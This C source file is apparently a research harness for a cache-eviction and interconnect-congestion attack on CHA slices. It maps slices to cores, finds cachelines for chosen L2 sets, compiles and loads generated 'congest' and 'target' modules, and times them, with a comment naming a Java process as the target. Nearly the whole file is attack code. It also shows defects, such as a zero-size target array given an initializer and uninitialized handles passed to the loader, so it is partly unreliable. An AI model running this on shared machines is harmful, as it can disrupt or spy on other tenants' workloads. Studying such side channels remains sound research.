#include <stdio.h>
#include <dlfcn.h>
#include "utils_op.h"

// CHA-Core MAP of this machine
int CHA_CPU_LIST[NUM_CHA_USED][2] = {{0,0},{1,12},{2,6},{3,18},{4,1},{5,13},{6,7},{7,19},{8,2},{9,14},{10,8},{11,20},{12,3},{13,15},{14,9},{15,21},{16,4},{17,16},{18,10},{19,22},{20,5},{21,17},{22,11},{23,23}};

#define FLOW_MAKE_PAIR_NUM 2
#define TARGET_NUM 0 // In this experiment, the target is java;

uint64_t L2_INDEX_LIST[L2_INDEX_NUM]; //= {0x2a7,0x2a8,0xa9,0x2aa,0x0a1,0x1b2,0xc2,0xde,0x2ef,0xf0};
int FLOW_MADE_LIST[FLOW_MAKE_PAIR_NUM][2];  
int TARGET_LIST[TARGET_NUM][2] = {{4, 22}};

void log_local(thread_args *thread_args_list);

int main(int argc, char *argv[]){
    if(argc < 5){
        printf("Usage: ./L2_evict_congest_args [core pair list]\n");
        exit(0);
    }

    for(int i=0; i<L2_INDEX_NUM; i++){
        L2_INDEX_LIST[i] = (uint64_t)atol(argv[i+1]);
    }

    for(int i=0; i<FLOW_MAKE_PAIR_NUM; i++){
        FLOW_MADE_LIST[i][0] = atoi(argv[L2_INDEX_NUM+1 + i*2]);
        FLOW_MADE_LIST[i][1] = atoi(argv[L2_INDEX_NUM+1 + i*2 + 1]);
    }
    for(int i=0; i< FLOW_MAKE_PAIR_NUM; i++){
        printf("attack: %d -> %d\n", FLOW_MADE_LIST[i][0], FLOW_MADE_LIST[i][1]);
    }


    Init_V();

    for(int i=0; i<FLOW_MAKE_PAIR_NUM; i++){
        int cha_id = FLOW_MADE_LIST[i][1];
        read_phyaddr(cha_id);
        for(uint64_t i=0; i< cacheline_nums_of_cha[cha_id]; i++){
            uint64_t phy = cachelines_by_cha_phy[cha_id][i];
            //printf("phy:%lx\n", phy);
            uint64_t vitual = phy_2_vitual(phy);
            //printf("GOT vitual: %lx\n", vitual);
            cachelines_by_cha[cha_id][i] = vitual;
        }
    }

    for(int i=0; i<TARGET_NUM; i++){
        int cha_id = TARGET_LIST[i][1];
        read_phyaddr(cha_id);
        for(uint64_t i=0; i< cacheline_nums_of_cha[cha_id]; i++){
            uint64_t phy = cachelines_by_cha_phy[cha_id][i];
            uint64_t vitual = phy_2_vitual(phy);
            cachelines_by_cha[cha_id][i] = vitual;
        }
    }

    pthread_t thread_id_list[FLOW_MAKE_PAIR_NUM];
    thread_args thread_args_list[FLOW_MAKE_PAIR_NUM];

    pthread_t target_thread_id_list[TARGET_NUM];
    thread_args target_thread_args_list[TARGET_NUM];

    for(int i=0; i<FLOW_MAKE_PAIR_NUM; i++){
        int cha_id_0 = FLOW_MADE_LIST[i][0];
        int cha_id_1 = FLOW_MADE_LIST[i][1];
        int cpu_id = CHA_CPU_LIST[cha_id_0][1];
        thread_args_list[i].cpuid = cpu_id;

        uint64_t *cachelines  = (uint64_t*)malloc(CACHELINES_READ*(L2_INDEX_NUM+1)*sizeof(uint64_t));
        long total_found = 0;
        for(int j=0; j<L2_INDEX_NUM; j++){
            uint64_t index = L2_INDEX_LIST[j];
            find_cachelines(index, cha_id_1, cachelines+ j*CACHELINES_READ, CACHELINES_READ);
            total_found+=CACHELINES_READ;
        }
        thread_args_list[i].cachelines = cachelines;
        thread_args_list[i].cachelines_found = total_found;

        uint64_t* time_line = (uint64_t *)malloc(EXCHAGE_RATE*sizeof(uint64_t));
        if (time_line == (void *)(-1)) {
            perror("ERROR: mmap of array a failed! ");
            exit(1);
        }

        uint64_t *p = (uint64_t* )malloc(sizeof(uint64_t));
        thread_args_list[i].timeline_local =time_line;
        thread_args_list[i].timeline_p = p;

    }

    for(int i=0; i<TARGET_NUM; i++){
        int cha_id_0 = TARGET_LIST[i][0];
        int cha_id_1 = TARGET_LIST[i][1];
        int cpu_id = CHA_CPU_LIST[cha_id_0][1];
        target_thread_args_list[i].cpuid = cpu_id;

        uint64_t *cachelines  = (uint64_t*)malloc(CACHELINES_READ*(L2_INDEX_NUM+1)*sizeof(uint64_t));
        long total_found = 0;
        for(int j=0; j<L2_INDEX_NUM; j++){
            uint64_t index = cpu_id*L2_INDEX_NUM + L2_INDEX_LIST[j];
            find_cachelines(index, cha_id_1, cachelines+ j*CACHELINES_READ, CACHELINES_READ);
            total_found+=CACHELINES_READ;
        }
        target_thread_args_list[i].cachelines = cachelines;
        target_thread_args_list[i].cachelines_found = total_found;
    }

    void *H_list[FLOW_MAKE_PAIR_NUM];
    void *FUNC_POINTER[FLOW_MAKE_PAIR_NUM];

    void *TARGET_H_list[TARGET_NUM];
    void *TARGET_FUNC_POINTER[TARGET_NUM];

    for(int i=0; i<FLOW_MAKE_PAIR_NUM; i++){
        char head_filename[0x100];
        char target_filename[0x100];
        char func_name[0x100];
        char source_filename[0x100];

        snprintf(head_filename,0xff, "hard_code_%d.h",i);
        snprintf(source_filename,0xff,"hard_code_module_%d.c", i);
        snprintf(target_filename,0xff,"./hard_code_module_%d.so",i);
        snprintf(func_name,0xff,"congest_%d", i);
        
        Generate_head_file(thread_args_list[i].cachelines, thread_args_list[i].cachelines_found, head_filename);
        Generate_module_file(i, source_filename);

        FUNC_POINTER[i] = Compile_Load_SO(H_list[i], source_filename, target_filename, func_name);
    }

    for(int i=0; i<TARGET_NUM; i++){
        char head_filename[0x100];
        char target_filename[0x100];
        char func_name[0x100];
        char source_filename[0x100];

        snprintf(head_filename,0xff, "target_%d.h",i);
        snprintf(source_filename,0xff,"target_module_%d.c", i);
        snprintf(target_filename,0xff,"./target_module_%d.so",i);
        snprintf(func_name,0xff,"target_%d", i);
        
        Generate_head_file(target_thread_args_list[i].cachelines, target_thread_args_list[i].cachelines_found, head_filename);
        Generate_target_module_file(i, source_filename);

        TARGET_FUNC_POINTER[i] = Compile_Load_SO(TARGET_H_list[i], source_filename, target_filename, func_name);
    }


    uint64_t TIME_5, TIME_6;
    
    TIME_5 = rdtscp(); 
    for(int i=0; i<FLOW_MAKE_PAIR_NUM; i++)
        pthread_create(&(thread_id_list[i]), NULL, FUNC_POINTER[i], (void*)&(thread_args_list[i])); 
    
    for(int i=0; i<TARGET_NUM; i++)
        pthread_create(&(target_thread_id_list[i]), NULL, TARGET_FUNC_POINTER[i], (void*)&(target_thread_args_list[i])); 

    for(int i=0; i<FLOW_MAKE_PAIR_NUM; i++)
        pthread_join(thread_id_list[i], NULL);

    for(int i=0; i<TARGET_NUM; i++)
        pthread_join(target_thread_id_list[i], NULL);
    TIME_6 = rdtscp();

    uint64_t cycles = TIME_6 - TIME_5;
    printf("TOTAL CYCLES: %ld\n", cycles);
    printf("TIME: %lf\n", cycles/CPU_FREQ);

	puts("Detect done! Start analyzing..."); 
    log_local(thread_args_list);
    return 0;
}

void log_local(thread_args *thread_args_list){
    for(int i=0; i<FLOW_MAKE_PAIR_NUM; i++){
        uint64_t *time_line = thread_args_list[i].timeline_local ;
        uint64_t *p         = thread_args_list[i].timeline_p ;
        uint64_t N = *p;

        char log_name[0x100];
        snprintf(log_name, 0xff, "time_line_%d.log", i);
        FILE *fp=fopen(log_name,"w");
        printf("%ld\n", time_line[0]);
        printf("%ld\n", time_line[N-1]);

        double total_time=0;
        for(uint64_t k=0; k<N; k++){
            fwrite(&(time_line[k]), sizeof(uint64_t), 1, fp);
        }
        fclose(fp);
    }
}
